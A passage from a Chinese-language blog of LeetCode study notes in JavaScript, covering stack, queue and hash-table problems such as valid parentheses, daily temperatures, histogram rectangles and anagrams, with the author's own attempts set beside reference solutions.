null，则递归搜寻 root 的左右子树：</p><ul><li>如果左右子树的递归都有结果，说明 p 和 q 分居 root 的左右子树，返回 root。</li><li>如果只是一个子树递归调用有结果，说明 p 和 q 都在这个子树，返回该子树递归结果。</li><li>如果两个子树递归结果都为 null，说明 p 和 q 都不在这俩子树中，返回 null。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lowestCommonAncestor = <span class="function"><span class="keyword">function</span>(<span class="params">root, p, q</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!root || root === q || root === p)  <span class="keyword">return</span> root;</span><br><span class="line">  <span class="comment">// 非null 非q 非p，则递归左右子树</span></span><br><span class="line">  <span class="keyword">let</span> left = lowestCommonAncestor(root.left, p, q);</span><br><span class="line">  <span class="keyword">let</span> right = lowestCommonAncestor(root.right, p, q);</span><br><span class="line">  <span class="comment">// 根据递归的结果，决定谁是LCA</span></span><br><span class="line">  <span class="keyword">if</span> (left &amp;&amp; right) &#123;</span><br><span class="line">      <span class="keyword">return</span> root;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> left ? left : right;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="LeetCode20——有效的括号（☆）（★）"><a href="#LeetCode20——有效的括号（☆）（★）" class="headerlink" title="LeetCode20——有效的括号（☆）（★）"></a>LeetCode20——有效的括号（☆）（★）</h2><p><a href="https://leetcode-cn.com/problems/valid-parentheses/">跳转地址</a></p><h3 id="自己的代码-57"><a href="#自己的代码-57" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;[&#x27;</span> || s[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">            stack.push(s[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s[i])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>: &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack[stack.length-<span class="number">1</span>] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        stack.pop();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.length==<span class="number">0</span>?<span class="literal">true</span>:<span class="literal">false</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>又臭又长。</p><h3 id="思路-amp-题解-32"><a href="#思路-amp-题解-32" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;   </span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; s.length ; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> c = s.charAt(i);</span><br><span class="line">        <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>: stack.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>: stack.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>: stack.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span> (c !== stack.pop()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack.length === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 或者放入 map</span></span><br><span class="line"><span class="keyword">var</span> isValid = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;   </span><br><span class="line">    <span class="keyword">const</span> stack = [];</span><br><span class="line">    <span class="keyword">const</span> map = &#123;</span><br><span class="line">      <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; s.length ; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> c = s[i];</span><br><span class="line">        <span class="keyword">if</span> (map[c]) &#123;</span><br><span class="line">          stack.push(map[c])</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c !== stack.pop()) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !stack.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>基本类似的思路，但是匹配到左括号时， push 相应的右括号，再由后面的 pop 返回结果。</p><h2 id="LeetCode739——每日温度（☆☆）"><a href="#LeetCode739——每日温度（☆☆）" class="headerlink" title="LeetCode739——每日温度（☆☆）"></a>LeetCode739——每日温度（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/daily-temperatures/">跳转地址</a></p><h3 id="自己的代码-58"><a href="#自己的代码-58" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dailyTemperatures = <span class="function"><span class="keyword">function</span> (<span class="params">temperatures</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; temperatures.length; i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> flag = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">let</span> tem = temperatures[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = i+<span class="number">1</span>; j &lt; temperatures.length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tem &lt; temperatures[j]) &#123;</span><br><span class="line">                flag=<span class="literal">true</span></span><br><span class="line">                stack.push(j - i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123; stack.push(<span class="number">0</span>);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>暴力双重循环，时间复杂度太高了。O(n^2)</p><h3 id="思路-amp-题解-33"><a href="#思路-amp-题解-33" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>递减栈：</p><ul><li>如果当前元素比栈顶大，则让小项逐个出栈，直到当前元素比栈顶小，停止出栈</li><li>此时的栈顶元素就是当前项右边的第一个比自己大的元素索引，计算距离</li><li>当前项入栈</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> dailyTemperatures = <span class="function">(<span class="params">T</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">new</span> <span class="built_in">Array</span>(T.length).fill(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">const</span> stack = []</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = T.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">while</span> (stack.length &amp;&amp; T[i] &gt;= T[stack[stack.length - <span class="number">1</span>]]) &#123;</span><br><span class="line">      stack.pop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stack.length) &#123;</span><br><span class="line">      res[i] = stack[stack.length - <span class="number">1</span>] - i</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(i)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接用fill（0）填充数组。</p><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>一次遍历：O(n)；每个元素都出栈入栈各一次：线性时间的复杂度。综合：O(n)</li><li>空间复杂度：O(n)</li></ul><h2 id="LeetCode150——逆波兰表达式求值（☆☆）"><a href="#LeetCode150——逆波兰表达式求值（☆☆）" class="headerlink" title="LeetCode150——逆波兰表达式求值（☆☆）"></a>LeetCode150——逆波兰表达式求值（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/evaluate-reverse-polish-notation/">跳转地址</a></p><h3 id="自己的代码-59"><a href="#自己的代码-59" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evalRPN = <span class="function"><span class="keyword">function</span>(<span class="params">tokens</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> numStack = [], signStack = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; tokens.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(<span class="built_in">parseInt</span>(tokens[i]))) &#123;</span><br><span class="line">            numStack.push(tokens[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;         </span><br><span class="line">            signStack.push(tokens[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>把数字和符号放进两个栈后不知道该怎么做了。遇到符号，可能数字栈有多于两个数字，就进行操作。若少于2个，就挂起，等超过两个后操作。怎么实现呢？</p><h3 id="思路-amp-题解-34"><a href="#思路-amp-题解-34" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> evalRPN = <span class="function"><span class="keyword">function</span>(<span class="params">tokens</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stk = [], len = tokens.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp;</span><br><span class="line">        <span class="keyword">switch</span>(tokens[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">                temp = stk.pop() + stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                <span class="comment">// 后出栈的 减 先出栈的</span></span><br><span class="line">                temp = - stk.pop() + stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                temp = stk.pop() * stk.pop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">                <span class="comment">// 后出栈的 除以 先出栈的</span></span><br><span class="line">                <span class="comment">// parseInt 已经满足只保留整数部分的功能</span></span><br><span class="line">                temp = <span class="built_in">parseInt</span>(<span class="number">1</span> / stk.pop() * stk.pop());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 其余都是数字</span></span><br><span class="line">                temp = <span class="built_in">parseInt</span>(tokens[i]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stk.push(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stk[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>自己想太多了，既然是逆波兰表达式，就不可能存在先一个数字再一个符号的情况。设立一个栈，每次对下一个数判断，得到temp值然后push就行。不算难。</p><h2 id="LeetCode84——柱状图中最大的矩形（☆☆☆）"><a href="#LeetCode84——柱状图中最大的矩形（☆☆☆）" class="headerlink" title="LeetCode84——柱状图中最大的矩形（☆☆☆）"></a>LeetCode84——柱状图中最大的矩形（☆☆☆）</h2><p><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/">跳转地址</a></p><h3 id="自己的代码-60"><a href="#自己的代码-60" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>暴力求解：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>, minHeight = <span class="built_in">Number</span>.MAX_SAFE_INTEGER;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; heights.length; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; heights.length; j++)&#123;</span><br><span class="line">      <span class="comment">// 找到一次循环中最小高度的柱子</span></span><br><span class="line">      minHeight = <span class="built_in">Math</span>.min(minHeight, heights[j]);</span><br><span class="line">      maxArea = <span class="built_in">Math</span>.max(maxArea, minHeight * (j-i+<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度O（n^2）</li><li>空间复杂度O（1）</li></ul><h3 id="思路1-amp-题解-31"><a href="#思路1-amp-题解-31" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>暴力优化版：（确定柱子后，寻找左右边界）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> len = heights.length;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> left = i;</span><br><span class="line">    <span class="keyword">let</span> right = i;</span><br><span class="line">    <span class="comment">// 找到第 i 个柱子的 left bounder</span></span><br><span class="line">    <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; heights[left] &gt;= heights[i]) &#123;</span><br><span class="line">      left--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找到第 i 个柱子的 right bounder</span></span><br><span class="line">    <span class="keyword">while</span> (right &lt; len &amp;&amp; heights[right] &gt;= heights[i]) &#123;</span><br><span class="line">      right++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 确定 left、right 后就能知道这个柱子围成的面积</span></span><br><span class="line">    maxArea = <span class="built_in">Math</span>.max(maxArea, (right - left - <span class="number">1</span>) * heights[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度O（n^2）</li><li>空间复杂度O（1）</li></ul><h3 id="思路2-amp-题解-34"><a href="#思路2-amp-题解-34" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>单调递增栈：(很牛逼的思路)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> largestRectangleArea = <span class="function"><span class="keyword">function</span>(<span class="params">heights</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> maxArea = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> stack = [];</span><br><span class="line">  <span class="comment">// 第一个 0 为了让第一个柱子有左边界，最后一个 0 为了让最后一个柱子有右边界</span></span><br><span class="line">  heights = [<span class="number">0</span>, ...heights, <span class="number">0</span>]; </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; heights.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 比较栈顶元素值与第 i 个元素值大小，如果前者大于后者，则 pop 前者（因为找到右边界了），后者入栈并计算面积；否则后者入栈。</span></span><br><span class="line">    <span class="keyword">while</span> (stack.length &gt; <span class="number">0</span> &amp;&amp; heights[stack[stack.length - <span class="number">1</span>]] &gt; heights[i]) &#123;</span><br><span class="line">      maxArea = <span class="built_in">Math</span>.max(maxArea, heights[stack.pop()] * (i - stack[stack.length - <span class="number">1</span>] - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// push 的是下标，通过 height[stack[stack.length - 1]] 得到值</span></span><br><span class="line">    stack.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> maxArea;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LeetCode42——接雨水（☆☆☆）"><a href="#LeetCode42——接雨水（☆☆☆）" class="headerlink" title="LeetCode42——接雨水（☆☆☆）"></a>LeetCode42——接雨水（☆☆☆）</h2><p><a href="https://leetcode-cn.com/problems/trapping-rain-water/">跳转地址</a></p><p>todo，太难了，没看懂题解。（类似 LC84 ）</p><h2 id="LeetCode239——滑动窗口最大值（☆☆☆）"><a href="#LeetCode239——滑动窗口最大值（☆☆☆）" class="headerlink" title="LeetCode239——滑动窗口最大值（☆☆☆）"></a>LeetCode239——滑动窗口最大值（☆☆☆）</h2><p><a href="https://leetcode-cn.com/problems/sliding-window-maximum/">跳转地址</a></p><h3 id="自己的代码-61"><a href="#自己的代码-61" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length - k+<span class="number">1</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> max = -<span class="built_in">Number</span>.MAX_SAFE_INTEGER;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i; j &lt; i + k; j++)&#123;</span><br><span class="line">      max = <span class="built_in">Math</span>.max(max, nums[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    res.push(max);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>没过，O（n^2）超出时间限制。。</p><h3 id="思路1-amp-题解-32"><a href="#思路1-amp-题解-32" class="headerlink" title="思路1&amp;题解"></a>思路1&amp;题解</h3><p>暴破：(仍然超时，主要学习一下 api 调用)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span> (<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= nums.length - k; i++) &#123;</span><br><span class="line">        res.push(<span class="built_in">Math</span>.max(...nums.slice(i, i + k)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：O((N-k)*k)，N 是数组长度。</li><li>空间复杂度：O(1)。</li></ul><h3 id="思路2-amp-题解-35"><a href="#思路2-amp-题解-35" class="headerlink" title="思路2&amp;题解"></a>思路2&amp;题解</h3><p>维护一个双端队列，保证队列首元素总是最大的。并且队列只存当前窗口有的元素。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> maxSlidingWindow = <span class="function"><span class="keyword">function</span>(<span class="params">nums, k</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> q = [] <span class="comment">// 存放优先队列的元素下标，为了取值方便</span></span><br><span class="line">  <span class="keyword">const</span> result = [] <span class="comment">// 结果数组</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 如果队列不为空，当前元素大于队列里的其他元素，则弹出</span></span><br><span class="line">    <span class="keyword">while</span> (q.length &amp;&amp; nums[i] &gt;= nums[q[q.length - <span class="number">1</span>]]) &#123;</span><br><span class="line">      q.pop()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前元素下标入栈</span></span><br><span class="line">    q.push(i)</span><br><span class="line">    <span class="comment">// 判断当前最大值是否在窗口中，若不在则让其出队（有点没懂？？）</span></span><br><span class="line">    <span class="keyword">while</span> (q[<span class="number">0</span>] &lt;= i - k) &#123;</span><br><span class="line">      q.shift()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 达到窗口大小时，就向结果添加数据</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) result.push(nums[q[<span class="number">0</span>]])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><h2 id="LeetCode242——有效的字母异位词（☆）"><a href="#LeetCode242——有效的字母异位词（☆）" class="headerlink" title="LeetCode242——有效的字母异位词（☆）"></a>LeetCode242——有效的字母异位词（☆）</h2><p><a href="https://leetcode-cn.com/problems/valid-anagram/">跳转地址</a></p><h3 id="自己的代码-62"><a href="#自己的代码-62" class="headerlink" title="自己的代码"></a>自己的代码</h3><p>排序后再比较还是很简单的，重点是用 Map 。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s1=s.split(<span class="string">&quot;&quot;</span>).sort().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> t1=t.split(<span class="string">&quot;&quot;</span>).sort().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> s1===t1</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// map（没过）</span></span><br><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>(), s1 = s.split(<span class="string">&#x27;&#x27;</span>), t1 = t.split(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map[s1[i]]) &#123;</span><br><span class="line">      map[s1[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line">    map.set(s1[i], <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t1.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (map[t1[i]]) &#123;</span><br><span class="line">      map[t1[i]]--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> !map.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>原来只要新建 map 时令它为 {} 就行。如果是 new Map，就涉及到 has get set 等 api 。</p><h3 id="思路-amp-题解-35"><a href="#思路-amp-题解-35" class="headerlink" title="思路&amp;题解"></a>思路&amp;题解</h3><p>注意 map 不能直接 <code>map[i]++</code> ；字符串可以直接 for of 。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (t.length !== s.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> counts = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> s) &#123;</span><br><span class="line">        <span class="comment">// 学起来！</span></span><br><span class="line">        counts[c] = (counts[c] || <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c <span class="keyword">of</span> t) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!counts[c]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        counts[c]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="keyword">var</span> isAnagram = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length !== t.length) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> map = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">        map[s[i]] ? map[s[i]]++ : map[s[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; t.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map[t[i]]) map[t[i]]--;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="LeetCode49——字母异位词分组（☆☆）-1"><a href="#LeetCode49——字母异位词分组（☆☆）-1" class="headerlink" title="LeetCode49——字母异位词分组（☆☆）"></a>LeetCode49——字母异位词分组（☆☆）</h2><p><a href="https://leetcode-cn.com/problems/group-anagrams/">跳转地址</a></p><h3 id="自己的代码-63"><a href="#自己的代码-63" class="headerlink" title="自己的代码"></a>自己的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> groupAnagrams = <span class="function"><span class="keyword">function</span> (<span class="params">strs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> map = &#123;&#125;, res = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> strs) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = i.split(<span class="string">&#x27;&#x27;</span>).sort().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    map[str] ? map[str].push(i) : map[str] = [i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> map) &#123;</span><br><span class="line">    res.push(map[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>趁热打铁还是能写出来的哈哈。</p><h3 id="思路-amp-题解-36"><a href="#思路-amp-题解-36" class="headerlink" 